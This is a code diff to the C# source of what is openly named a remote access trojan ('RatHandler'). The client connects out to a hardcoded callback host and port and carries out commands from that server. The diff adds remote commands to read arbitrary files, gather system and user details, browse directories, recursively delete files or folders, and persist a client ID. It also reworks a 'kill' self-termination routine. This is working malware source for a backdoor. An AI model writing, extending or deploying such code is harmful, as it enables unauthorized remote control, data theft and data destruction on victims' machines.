@@ -6,7 +6,10 @@ using GeneralPurposeLib;
 
 namespace RAT; 
 
-public class RatHandler {
+public static class RatHandler {
+    private const string ServerHost = "ratcallback.serble.net";
+    private const int ServerPort = 6083;
+    
     private static string ReceiveMessage(Stream stream) {
         // Read until we get a newline
         StringBuilder cmdBuilder = new();
@@ -36,11 +39,19 @@ public class RatHandler {
             try {
                 ExecuteRat(stoppingToken).Wait(stoppingToken);
             }
-            catch (OperationCanceledException) {
-                Logger.Info("Exiting...");
+            catch (OperationCanceledException e) {
+                Logger.Info($"Exiting... ({e.Message})");
                 break;
             }
-            catch (Exception e) {
+            catch (AggregateException e) {
+                bool exit = false;
+                foreach (Exception exception in e.InnerExceptions) {
+                    if (exception is not OperationCanceledException) continue;
+                    Logger.Info($"Exiting... ({exception.Message})");
+                    exit = true;
+                    break;
+                }
+                if (exit) break;
                 Logger.Error(e.ToString());
                 Logger.Info("Reconnecting in 5 seconds");
                 Thread.Sleep(5000);
@@ -55,7 +66,7 @@ public class RatHandler {
         Logger.Info("RAT worker started");
 
         TcpClient client = new();
-        await client.ConnectAsync("ratcallback.serble.net", 6083, stoppingToken);
+        await client.ConnectAsync(ServerHost, ServerPort, stoppingToken);
         Logger.Info("Connected to RAT server");
 
         while (!stoppingToken.IsCancellationRequested) {
@@ -66,6 +77,7 @@ public class RatHandler {
             
             // Process command
             string[] args = message.Split(' ');
+            string argsCombined = string.Join(' ', args[1..]);
             string outData = "";
             switch (args[0]) {
                     
@@ -73,7 +85,99 @@ public class RatHandler {
                     // Send error message
                     outData = "ERROR: Unknown command";
                     break;
+
+                case "print": {
+                    // Prints the contents of a file
+                    if (args.Length < 2) {
+                        outData = "ERROR: Not enough arguments";
+                        break;
+                    }
+                    if (!File.Exists(argsCombined)) {
+                        outData = "ERROR: File does not exist";
+                        break;
+                    }
+                    outData = await File.ReadAllTextAsync(argsCombined, stoppingToken);
+                    break;
+                }
+
+                case "info": {
+                    // Display info about the system
+                    string os = RuntimeInformation.OSDescription;
+                    string arch = RuntimeInformation.OSArchitecture.ToString();
+                    string version = Environment.OSVersion.VersionString;
+                    string user = Environment.UserName;
+                    string is64BitProcess = Environment.Is64BitProcess ? "64-bit" : "32-bit";
+                    string currentDirectory = Environment.CurrentDirectory;
+                    string systemDirectory = Environment.SystemDirectory;
+                    string machineName = Environment.MachineName;
+                    string systemCpuCount = Environment.ProcessorCount.ToString();
+                    string ratUptime = (DateTime.Now - Process.GetCurrentProcess().StartTime).ToFormat("{d} days, {h} hours, {m} minutes, {s} seconds");
+                    string systemUptime = TimeSpan.FromMilliseconds(Environment.TickCount).ToFormat("{d} days, {h} hours, {m} minutes, {s} seconds");
+                    outData = $"Machine Name: {machineName}\n" +
+                              $"OS: {os}\n" +
+                              $"OS Version: {version}\n" +
+                              $"Process Architecture: {is64BitProcess}\n" +
+                              $"Architecture: {arch}\n" +
+                              $"Current User: {user}\n" +
+                              $"Current Directory: {currentDirectory}\n" +
+                              $"System Directory: {systemDirectory}\n" +
+                              $"Processor Count: {systemCpuCount}\n" +
+                              $"RAT Uptime: {ratUptime}\n" +
+                              $"System Uptime: {systemUptime}";
+                    break;
+                }
+
+                case "ls": {
+                    string[] directories = Directory.GetDirectories(args.Length > 1 ? args[1] : ".");
+                    string[] files = Directory.GetFiles(args.Length > 1 ? args[1] : ".");
+                    outData = "Directories:\n" +
+                              string.Join("\n", directories) + "\n" +
+                              "Files:\n" +
+                              string.Join("\n", files);
+                    break;
+                }
+                
+                case "cd": {
+                    if (args.Length < 2) {
+                        outData = Directory.GetCurrentDirectory();
+                        break;
+                    }
+                    try {
+                        Directory.SetCurrentDirectory(argsCombined);
+                        outData = "OK";
+                    }
+                    catch (Exception e) {
+                        outData = $"ERROR: {e.Message}";
+                    }
+                    break;
+                }
+
+                case "del": {
+                    if (args.Length < 2) {
+                        outData = "ERROR: No file or directory specified";
+                        break;
+                    }
+
+                    if (!File.Exists(argsCombined) && !Directory.Exists(argsCombined)) {
+                        outData = "ERROR: File or directory does not exist";
+                        break;
+                    }
                     
+                    try {
+                        if (File.Exists(argsCombined)) {
+                            File.Delete(argsCombined);
+                        }
+                        else {
+                            Directory.Delete(argsCombined, true);
+                        }
+                        outData = "OK";
+                    }
+                    catch (Exception e) {
+                        outData = $"ERROR: {e.Message}";
+                    }
+                    break;
+                }
+
                 case "ping":
                     // Send pong message
                     outData = "pong";
@@ -81,7 +185,14 @@ public class RatHandler {
 
                 case "init":
                     // Send initialization message
-                    outData = "init";
+                    string id = Guid.NewGuid().ToString();
+                    if (File.Exists("id.txt")) {
+                        id = await File.ReadAllTextAsync("id.txt", stoppingToken);
+                    }
+                    else {
+                        await File.WriteAllTextAsync("id.txt", id, stoppingToken);
+                    }
+                    outData = id;
                     break;
 
                 case "run": {
@@ -160,24 +271,18 @@ public class RatHandler {
                 }
 
                 case "continue":
-                    // Respond with "Ok"
-                    outData = "Ok";
                     break;
                 
-                case "exit":
-                    throw new OperationCanceledException();
+                case "quit":
+                    throw new OperationCanceledException("RAT server requested shutdown of client");
 
                 case "kill": {
-                    // Spam windows
                     OsPlatform osPlatform = GetPlatform();
-                    string terminalEmulator = osPlatform switch {
-                        OsPlatform.Windows => "cmd.exe",
-                        OsPlatform.Linux => "bash",
-                        OsPlatform.OSX => "bash",
-                        _ => "bash"
-                    };
-                    
-                    Task killTsk = Kill(osPlatform);
+                    Thread thread = new(() => {
+                        Kill(osPlatform);
+                    });
+                    thread.Start();
+                    outData = "Commiting suicide in 5 seconds...";
                     break;
                 }
 
@@ -221,7 +326,11 @@ public class RatHandler {
         
     }
 
-    private static Task Kill(OsPlatform platform) {
+    private static void Kill(OsPlatform platform) {
+        // Wait 5 seconds before killing so that the response can be sent
+        Logger.Warn("Commiting suicide in 5 seconds...");
+        Thread.Sleep(5000);
+
         switch (platform) {
 
             case OsPlatform.Windows: {
@@ -250,8 +359,6 @@ public class RatHandler {
             default:
                 throw new ArgumentOutOfRangeException(nameof(platform), platform, null);
         }
-
-        return Task.CompletedTask;
     }
     
     private static OsPlatform GetPlatform() {
